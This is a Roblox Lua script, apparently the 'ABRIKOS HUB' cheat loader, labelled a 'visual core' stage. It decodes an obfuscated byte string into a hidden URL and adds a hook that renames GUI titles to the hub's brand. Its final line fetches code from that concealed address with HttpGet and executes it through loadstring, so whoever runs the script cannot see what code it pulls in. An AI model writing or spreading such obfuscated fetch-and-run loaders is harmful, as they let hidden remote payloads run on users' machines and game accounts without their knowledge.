
--[[ STAGE 2: VISUAL CORE ]]
local gyir9owUZGmlx="\108\090\099\035\029\030\115\041\119\046\123\044\070\130\134\119\120\128\094\084\061\127\090\151\136\117\098\158\146\153\148\121\110\098\114\168\178\174\171\147\126\185\188\173\196\193\183\150\126\191\200\210\200\136\203\205\220\200\214\224\220\211\229\156\231\220\225\242\232\242\236\250\237\240\241\180\248\248\006\187\247\255\012\253\005\008\022\007\024\012\012\031\016\029\019\034\038\223\026\050\033\232\234\223\042\045\043\045\059"local fuS2DtqbDFbV6g9z9Tt=30 local AYqVbovkyiitgcBC3=228 local MX3iNRfpOg8JXEmLrRG=0 local uzpJXscGzNKr_BgmZIa24=2 local uK7XrgoGu1PDQb4aj1KSh=7 local S7t3o5uApIsRbJyc2zilS=true local qCzkaizgbdjzfdj=bit32 and bit32.bxor if not qCzkaizgbdjzfdj then qCzkaizgbdjzfdj=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local DIF0vRzMktgKIj={}for lwSHzXx3eONf7Oa0j=1,#gyir9owUZGmlx do local c0qAZFBs4JnsTsWD5fPIA=string.byte(gyir9owUZGmlx,lwSHzXx3eONf7Oa0j)local ZsvPFa9v18XRpeh8UXh=(AYqVbovkyiitgcBC3+(lwSHzXx3eONf7Oa0j*uzpJXscGzNKr_BgmZIa24)+uK7XrgoGu1PDQb4aj1KSh)%256 if MX3iNRfpOg8JXEmLrRG==0 then c0qAZFBs4JnsTsWD5fPIA=(c0qAZFBs4JnsTsWD5fPIA-ZsvPFa9v18XRpeh8UXh)%256 DIF0vRzMktgKIj[lwSHzXx3eONf7Oa0j]=string.char(qCzkaizgbdjzfdj(c0qAZFBs4JnsTsWD5fPIA,fuS2DtqbDFbV6g9z9Tt))else c0qAZFBs4JnsTsWD5fPIA=qCzkaizgbdjzfdj(c0qAZFBs4JnsTsWD5fPIA,fuS2DtqbDFbV6g9z9Tt)DIF0vRzMktgKIj[lwSHzXx3eONf7Oa0j]=string.char((c0qAZFBs4JnsTsWD5fPIA-ZsvPFa9v18XRpeh8UXh)%256)end end local NdJEJTu5C8v1fMmmDxFd5=table.concat(DIF0vRzMktgKIj)if S7t3o5uApIsRbJyc2zilS then NdJEJTu5C8v1fMmmDxFd5=string.reverse(NdJEJTu5C8v1fMmmDxFd5)end local ziOcO8cQGkhF=NdJEJTu5C8v1fMmmDxFd5
local HubName = "ABRIKOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(ziOcO8cQGkhF))()
